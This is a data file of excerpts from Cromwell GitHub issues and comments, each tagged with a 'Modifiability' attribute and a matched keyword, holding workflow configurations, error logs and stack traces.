cromwell.backend.impl.sfs.config.DeclarationValidation.extractWdlValueOption(DeclarationValidation.scala:113); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.$anonfun$runtimeAttributeInputs$1(ConfigAsyncJobExecutionActor.scala:163). <!-- Which backend are you running? -->; I use the SGE backend ; <!-- Paste/Attach your workflow if possible: -->; this is my WDL workflow; """"""; workflow testsge{; String Outdir; String JobName=""filter""; call filter{input:outdir=Outdir,jobname=JobName}; }. task filter{; String outdir; String jobname; command<<<; echo ""test successful"" >>${outdir}/log.stdout; echo 1; perl -we '{print STDERR 2;}'; Script=""${jobname}""; Sleep=$SGE_TASK_ID; QsubRcControl=3; QsubType=1; >>>; runtime{; backend:""SGE""; memory:""1 GB""; sge_queue:""test.q -P test -t 1-3""; sge_project:""test""; jobs_name:""${jobname}""; }; output{; String presuccess=""done""; Int rc=read_lines(stdout())[0]; }; }; """"""; <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERI",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3805:1337,config,config,1337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3805,1,['config'],['config']
Modifiability,"tutorials/PipelinesApi101/). The following command does not work:; ```; $ gcloud projects add-iam-policy-binding xxx --member serviceAccount:xxx@xxx.gserviceaccount.com --role roles/compute.zones.list; ERROR: Policy modification failed. For a binding with condition, run ""gcloud alpha iam policies lint-condition"" to identify issues in condition.; ERROR: (gcloud.projects.add-iam-policy-binding) INVALID_ARGUMENT: Role roles/compute.zones.list is not supported for this resource.; ```; I have no idea what I should do. Why can't Cromwell simply provide the command line needed to change the permission?. As for Requester Pays, following the [documentation](https://cromwell.readthedocs.io/en/stable/filesystems/GoogleCloudStorage/#requester-pays) I have set up the `project` field in the `gcs` filesystem configuration (completely unclear which one in the documentation, as according to the tutorial there are two, but I have included `project` in both ...) in the configuration file as follows:; ```; include required(classpath(""application"")). google {; application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. engine {; filesystems {; gcs {; auth = ""application-default""; project = ""xxx""; }; }; }. backend {; default = ""JES""; providers {; JES {; actor-factory = ""cromwell.backend.impl.jes.JesBackendLifecycleActorFactory""; config {; // Google project; project = ""xxx"". // Base bucket for workflow executions; root = ""gs://xxx/cromwell-execution"". // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. // Optional Dockerhub Credentials. Can be used to access private docker images.; dockerhub {; // account = """"; // token = """"; }. genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; // Endpoint for APIs, n",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471:1383,config,configuration,1383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5594#issuecomment-665256471,2,['config'],['configuration']
Modifiability,"two in the JIRA issue tracker back in August.; > Reposting here since it didn't get a response over there:; > https://broadworkbench.atlassian.net/browse/BA-6548; >; > Hello everyone,; >; > I am attempting to use the AWS Batch backend for Cromwell to run a wdl; > script which runs several subjobs in parallel. I believe the correct; > parlance is a scatter. I noticed that in some of the jobs of the scatter,; > some reference files failed to download from S3 even though they existed; > (Connection Reset by Peer). This failure caused the overall job to fail; > after one hour of running.; >; > I believe this issue was reported and fixed before, around May 2019, but; > recently, in June 2020, it appears the AWS Batch backend was majorly; > overhauled (by @markjschreiber <https://github.com/markjschreiber>,; > thanks! Also, tagging you because I suspect you might be the resident; > expert here :) ), and the previous fix (using the ecs proxy image) was; > supposedly obsoleted.; >; > I also see that the s3fs library appears to be vendored into cromwell, and; > after digging around, it appears that one might be able to set retries via; > an environment variable(?). But even then, I feel like if that were to; > work, it would be much nicer if it was configurable through cromwell's; > config file somehow.; >; > So that brings me to my final question. Is there some configuration that; > allows me to retry failed downloads some number of times before failing the; > whole job? Or, perhap there is some alternative configuraiton which I've; > overlooked and someone could point me to it? Thanks!; >; > In addition, just wondering if perhaps there is a service limit I might be; > running into?; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946>, or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6ENB62FDV4UVUUQGAE3SKXWAPANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780:2250,variab,variable,2250,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-710428780,5,"['config', 'variab']","['config', 'configurable', 'configuraiton', 'configuration', 'variable']"
Modifiability,"tyvm for the super useful repo config! I found a couple of minor issues while working on BT-226 as documented in BT-243. Before: ; <img width=""649"" alt=""Screen Shot 2021-04-25 at 11 11 12 AM"" src=""https://user-images.githubusercontent.com/10790523/115998865-5cd51a00-a5b7-11eb-9165-8a4abb8a340c.png"">. After:; <img width=""649"" alt=""Screen Shot 2021-04-25 at 11 15 01 AM"" src=""https://user-images.githubusercontent.com/10790523/115998922-a9b8f080-a5b7-11eb-834e-db6dfbef292b.png"">",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6322:31,config,config,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6322,1,['config'],['config']
Modifiability,"ult""; scheme = ""application_default""; },; {; name = ""user-via-refresh""; scheme = ""refresh_token""; client-id = ""secret_id""; client-secret = ""secret_secret""; },; {; name = ""service-account""; scheme = ""service_account""; service-account-id = ""my-service-account""; pem-file = ""/path/to/file.pem""; }; ]; }. engine {; // This instructs the engine which filesystems are at its disposal to perform any IO operation that it might need.; // For instance, WDL variables declared at the Workflow level will be evaluated using the filesystems declared here.; // If you intend to be able to run workflows with this kind of declarations:; // workflow {; // String str = read_string(""gs://bucket/my-file.txt""); // }; // You will need to provide the engine with a gcs filesystem; // Note that the default filesystem (local) is always available.; //filesystems {; // gcs {; // auth = ""application-default""; // }; //}; }. backend {; default = ""Local""; providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 28; run-in-background = true; runtime-attributes = ""String? docker""; submit = ""/bin/bash ${script}""; submit-docker = ""docker run --rm -v ${cwd}:${docker_cwd} -i ${docker} /bin/bash < ${script}"". // Root directory where Cromwell writes job results. This directory must be; // visible and writeable by the Cromwell process as well as the jobs that Cromwell; // launches.; root: ""cromwell-executions"". filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; }. local {; // Cromwell makes a link to your input files within <root>/<workflow UUID>/workflow-inputs; // The following are strategies used to make those links. They are ordered. If one fails; // The next one is tried:; //; // hard-link: attempt to create a hard-link to the file; // copy: copy the file; // soft-link: create a symbolic link to the file; //; // NOTE: soft-link will",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1480:87891,config,config,87891,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1480,1,['config'],['config']
Modifiability,"ummary refreshing every 2 seconds.; [2018-09-14 13:19:55,31] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:19:55,32] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:19:55,32] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-09-14 13:19:56,83] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-09-14 13:19:56,88] [info] SingleWorkflowRunnerActor: Version 35-fd560e9-SNAP; [2018-09-14 13:19:56,91] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-09-14 13:19:57,89] [info] CWL (Unspecified version) workflow caab4283-a3d4-4966-85ba-56d0992c8f00 submitted; [2018-09-14 13:19:57,90] [info] SingleWorkflowRunnerActor: Workflow submitted caab4283-a3d4-4966-85ba-56d0992c8f00; [2018-09-14 13:19:57,91] [info] 1 new workflows fetched; [2018-09-14 13:19:57,92] [info] WorkflowManagerActor Starting workflow caab4283-a3d4-4966-85ba-56d0992c8f00; [2018-09-14 13:19:57,93] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-09-14 13:19:57,96] [info] WorkflowManagerActor Successfully started WorkflowActor-caab4283-a3d4-4966-85ba-56d0992c8f00; [2018-09-14 13:19:57,96] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-09-14 13:19:57,96] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-09-14 13:19:58,11] [info] MaterializeWorkflowDescriptorActor [caab4283]: Parsing workflow as CWL v1.0; [2018-09-14 13:20:00,08] [error] WorkflowManagerActor Workflow caab4283-a3d4-4966-85ba-56d0992c8f00 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Custom type file:///home/jeremiah/gdc-dnaseq-cwl/workflows/bamfastq_align/transform_pack.cwl#",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103:2993,config,configured,2993,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103,1,['config'],['configured']
Modifiability,"ummary refreshing every 2 seconds.; [2018-09-14 13:21:51,44] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:21:51,45] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-09-14 13:21:51,51] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-09-14 13:21:52,32] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-09-14 13:21:52,35] [info] SingleWorkflowRunnerActor: Version 35-fd560e9-SNAP; [2018-09-14 13:21:52,36] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-09-14 13:21:52,42] [info] CWL (Unspecified version) workflow 6f311835-f1fe-4bbd-8fbb-c5543373d039 submitted; [2018-09-14 13:21:52,43] [info] SingleWorkflowRunnerActor: Workflow submitted 6f311835-f1fe-4bbd-8fbb-c5543373d039; [2018-09-14 13:21:52,43] [info] 1 new workflows fetched; [2018-09-14 13:21:53,05] [info] WorkflowManagerActor Starting workflow 6f311835-f1fe-4bbd-8fbb-c5543373d039; [2018-09-14 13:21:53,06] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-09-14 13:21:53,09] [info] WorkflowManagerActor Successfully started WorkflowActor-6f311835-f1fe-4bbd-8fbb-c5543373d039; [2018-09-14 13:21:53,09] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-09-14 13:21:53,10] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-09-14 13:21:53,21] [info] MaterializeWorkflowDescriptorActor [6f311835]: Parsing workflow as CWL v1.0; [2018-09-14 13:21:55,91] [info] MaterializeWorkflowDescriptorActor [6f311835]: Call-to-Backend assignments: bam_ls_l -> Local, bam_readgroup_to_json -> Local, fastqc -> Local, json_to_sqlite -> Local, merge_readgroup_json_db -> Local, fastq_cleaner_se -> Local, picard_collecttargetedpcrmetrics_to_sqlite -> Local, biobambam_bamtofastq -> Local, readgroup_json_db -> Local, pic",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103:20819,config,configured,20819,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103,1,['config'],['configured']
Modifiability,"ummary refreshing every 2 seconds.; [2018-10-25 21:17:12,98] [info] KvWriteActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-25 21:17:12,98] [info] CallCacheWriteActor configured to flush with batch size 100 and process rate 3 seconds.; [2018-10-25 21:17:12,98] [info] WriteMetadataActor configured to flush with batch size 200 and process rate 5 seconds.; [2018-10-25 21:17:13,79] [info] JobExecutionTokenDispenser - Distribution rate: 50 per 1 seconds.; [2018-10-25 21:17:13,80] [info] SingleWorkflowRunnerActor: Version 36; [2018-10-25 21:17:13,81] [info] SingleWorkflowRunnerActor: Submitting workflow; [2018-10-25 21:17:13,84] [info] Unspecified type (Unspecified version) workflow e22c6324-5aec-4694-8750-f62160e2ca81 submitted; [2018-10-25 21:17:13,85] [info] SingleWorkflowRunnerActor: Workflow submitted e22c6324-5aec-4694-8750-f62160e2ca81; [2018-10-25 21:17:13,85] [info] 1 new workflows fetched; [2018-10-25 21:17:13,85] [info] WorkflowManagerActor Starting workflow e22c6324-5aec-4694-8750-f62160e2ca81; [2018-10-25 21:17:13,86] [info] WorkflowManagerActor Successfully started WorkflowActor-e22c6324-5aec-4694-8750-f62160e2ca81; [2018-10-25 21:17:13,86] [info] Retrieved 1 workflows from the WorkflowStoreActor; [2018-10-25 21:17:13,86] [warn] SingleWorkflowRunnerActor: received unexpected message: Done in state RunningSwraData; [2018-10-25 21:17:13,87] [info] WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; [2018-10-25 21:17:13,95] [info] MaterializeWorkflowDescriptorActor [e22c6324]: Parsing workflow as WDL draft-2; [2018-10-25 21:17:14,52] [info] MaterializeWorkflowDescriptorActor [e22c6324]: Call-to-Backend assignments: test_opt_array.t1 -> Local; [2018-10-25 21:17:20,89] [info] WorkflowExecutionActor-e22c6324-5aec-4694-8750-f62160e2ca81 [e22c6324]: Starting test_opt_array.t1 (5 shards); [2018-10-25 21:17:22,98] [info] BackgroundConfigAsyncJobExecutionActor [e22c6324test_opt_array.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4318:11963,config,configured,11963,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4318,1,['config'],['configured']
Modifiability,un$46.apply(SlickDataAccess.scala:569) ~[cromwell.jar:0.19]; 905198- at cromwell.engine.db.slick.SlickDataAccess$$anonfun$46.apply(SlickDataAccess.scala:568) ~[cromwell.jar:0.19]; 905199- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905200- at slick.backend.DatabaseComponent$DatabaseDef$$anonfun$runInContext$1.apply(DatabaseComponent.scala:146) ~[cromwell.jar:0.19]; 905201- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:251) ~[cromwell.jar:0.19]; 905202- at scala.concurrent.Future$$anonfun$flatMap$1.apply(Future.scala:249) ~[cromwell.jar:0.19]; 905203- at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; 905204- at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; 905205- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 905206- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 905207- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 905208- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 905209- at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; 905210- at scala.concurrent.impl.ExecutionContextImpl$AdaptedForkJoinTask.exec(ExecutionContextImpl.scala:121) ~[cromwell.jar:0.19]; 905211- at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; 905212- at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; 905213- at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; 905214- at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]. ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102:7168,Adapt,AdaptedForkJoinTask,7168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/738#issuecomment-214521102,1,['Adapt'],['AdaptedForkJoinTask']
Modifiability,un(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: lenthall.exception.AggregatedException: :; Variable 'non_existent_scatter_variable' not found; 	at lenthall.util.TryUtil$.sequenceIterable(TryUtil.scala:26); 	at lenthall.util.TryUtil$.sequence(TryUtil.scala:33); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$startRunnableScopes(WorkflowExecutionActor.scala:373); 	... 20 common frames omitted; 	Suppressed: wdl4s.exception.VariableNotFoundException$$anon$1: Variable 'non_existent_scatter_variable' not found; 		at wdl4s.exception.VariableNotFoundException$.apply(LookupException.scala:17); 		at wdl4s.Scope$$anonfun$6.apply(Scope.scala:268); 		at wdl4s.Scope$$anonfun$6.apply(Scope.scala:268); 		at scala.Option.getOrElse(Option.scala:121); 		at wdl4s.Scope$class.lookup$1(Scope.scala:267); 		at wdl4s.Scope$$anonfun$lookupFunction$1.apply(Scope.scala:274); 		at wdl4s.Scope$$anonfun$lookupFunction$1.apply(Scope.scala:274); 		at wdl4s.expression.ValueEvaluator$$anonfun$evaluate$1.apply(ValueEvaluator.scala:45); 		at wdl4s.expression.ValueEvaluator$$anonfun$evaluate$1.apply(ValueEvaluator.scala:45); 		at scala.util.Try$.apply(Try.scala:192); 		at wdl4s.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:45); 		at wdl4s.WdlExpression$.evaluate(WdlExpression.scala:85); 		at wdl4s.WdlExpression.evaluate(WdlExpression.scala:161); 		at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$processRunnableScatter(WorkflowExecutionActor.scala:509); 		at c,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2020:3689,Variab,VariableNotFoundException,3689,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2020,1,['Variab'],['VariableNotFoundException']
Modifiability,un.nio.ch.ChannelInputStream.read(ChannelInputStream.java:109); at sun.nio.ch.ChannelInputStream.read(ChannelInputStream.java:103); - locked <0x00000006c54b2ec8> (a sun.nio.ch.ChannelInputStream); at org.apache.commons.codec.digest.DigestUtils.updateDigest(DigestUtils.java:798); at org.apache.commons.codec.digest.DigestUtils.digest(DigestUtils.java:50); at org.apache.commons.codec.digest.DigestUtils.md5(DigestUtils.java:274); at org.apache.commons.codec.digest.DigestUtils.md5Hex(DigestUtils.java:310); at cromwell.backend.impl.sfs.config.HashFileStrategy$$anonfun$hash$3.apply(ConfigHashingStrategy.scala:70); at cromwell.backend.impl.sfs.config.HashFileStrategy$$anonfun$hash$3.apply(ConfigHashingStrategy.scala:70); at cromwell.util.TryWithResource$$anonfun$tryWithResource$1.apply(TryWithResource.scala:16); at scala.util.Try$.apply(Try.scala:192); at cromwell.util.TryWithResource$.tryWithResource(TryWithResource.scala:10); at cromwell.backend.impl.sfs.config.HashFileStrategy.hash(ConfigHashingStrategy.scala:70); at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:47); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory$$anonfun$fileHashingFunction$1.apply(ConfigBackendLifecycleActorFactory.scala:45); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1$$anonfun$1.apply(FileHashingActor.scala:21); at scala.Option.map(Option.scala:146); at cromwell.backend.callcaching.FileHashingActor$$anonfun$receive$1.applyOrElse(FileHashingActor.scala:21); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.callcaching.FileHashingActor.aroundReceive(FileHashingActor.scala:16); at akka.actor.ActorCell.receiveMessage(ActorCel,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1597:1797,Config,ConfigHashingStrategy,1797,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1597,1,['Config'],['ConfigHashingStrategy']
Modifiability,unLoop.scala:362); 	at cats.effect.internals.Trampoline.cats$effect$internals$Trampoline$$immediateLoop(Trampoline.scala:70); 	at cats.effect.internals.Trampoline.startLoop(Trampoline.scala:36); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.super$startLoop(TrampolineEC.scala:93); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.$anonfun$startLoop$1(TrampolineEC.scala:93); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); 	at cats.effect.internals.Trampoline.execute(Trampoline.scala:43); 	at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); 	at cats.effect.internals.ForwardCancelable.loop$1(ForwardCancelable.scala:46); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1(ForwardCancelable.scala:52); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1$adapted(ForwardCancelable.scala:52); 	at cats.effect.internals.IORunLoop$RestartCallback.start(IORunLoop.scala:337); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:119); 	at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:34); 	at cats.effect.IO.unsafeRunAsync(IO.scala:258); 	at cats.effect.internals.IORace$.onSuccess$1(IORace.scala:40); 	at cats.effect.internals.IORace$.$anonfun$simple$4(IORace.scala:79); 	at cats.effect.internals.IORace$.$anonfun$simple$4$adapted(IORace.scala:77); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:136); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:351); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:372); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:312); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178:3403,adapt,adapted,3403,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178,1,['adapt'],['adapted']
Modifiability,unLoop.scala:366); 	at cats.effect.internals.Trampoline.cats$effect$internals$Trampoline$$immediateLoop(Trampoline.scala:70); 	at cats.effect.internals.Trampoline.startLoop(Trampoline.scala:36); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.super$startLoop(TrampolineEC.scala:93); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.$anonfun$startLoop$1(TrampolineEC.scala:93); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); 	at cats.effect.internals.Trampoline.execute(Trampoline.scala:43); 	at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); 	at cats.effect.internals.ForwardCancelable.loop$1(ForwardCancelable.scala:46); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1(ForwardCancelable.scala:52); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1$adapted(ForwardCancelable.scala:52); 	at cats.effect.internals.IORunLoop$RestartCallback.start(IORunLoop.scala:341); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:119); 	at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:34); 	at cats.effect.IO.unsafeRunAsync(IO.scala:257); 	at cats.effect.internals.IORace$.onSuccess$1(IORace.scala:40); 	at cats.effect.internals.IORace$.$anonfun$simple$4(IORace.scala:79); 	at cats.effect.internals.IORace$.$anonfun$simple$4$adapted(IORace.scala:77); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:136); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:355); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:376); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:316); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41),MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5925:2719,adapt,adapted,2719,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5925,1,['adapt'],['adapted']
Modifiability,"unTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: common.exception.AggregatedMessageException: Error(s):; Could not evaluate expression: ""-l h_vmem="" + memory + ""G"": Cannot perform operation: -l h_vmem= + WomLong(4); at common.validation.Validation$ValidationTry$.toTry$extension1(Validation.scala:77); at common.validation.Validation$ValidationTry$.toTry$extension0(Validation.scala:73); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:107); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.writeTaskScript$(ConfigAsyncJobExecutionActor.scala:55); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.writeTaskScript(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:43); at cromwell.backend.impl.sfs.config.ConfigAsyncJobExecutionActor.processArgs$(ConfigAsyncJobExecutionActor.scala:39); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs$lzycompute(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.processArgs(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner(SharedFileSystemAsyncJobExecutionActor.scala:174); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.makeProcessRunner$(SharedFileSystemAsyncJobExecutionActor.scala:171); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.makeProcessRunner(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.sfs.SharedFileSystemAsyncJobExecutionActor.$anonfun$execute$2(SharedFileSystemAsyncJobExecutionActor.scala:145); at scala.util.Either.fold(Either.scala:188); at crom",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4659:2455,Config,ConfigAsyncJobExecutionActor,2455,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4659,1,['Config'],['ConfigAsyncJobExecutionActor']
Modifiability,"undReceive(StandardFileHashingActor.scala:59); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527); 	at akka.actor.ActorCell.invoke(ActorCell.scala:496); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2018-05-02 15:22:54,71] [[38;5;1merror[0m] bc4644da:batch_for_variantcall:-1:1: Hash error, disabling call caching for this job.; java.io.FileNotFoundException: Cannot hash file null because it can't be found; 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.usingStandardInitData$1(ConfigHashingStrategy.scala:46); 	at cromwell.backend.impl.sfs.config.ConfigHashingStrategy.getHash(ConfigHashingStrategy.scala:57); 	at cromwell.backend.impl.sfs.config.ConfigBackendFileHashingActor.customHashStrategy(ConfigBackendFileHashingActor.scala:26); 	at 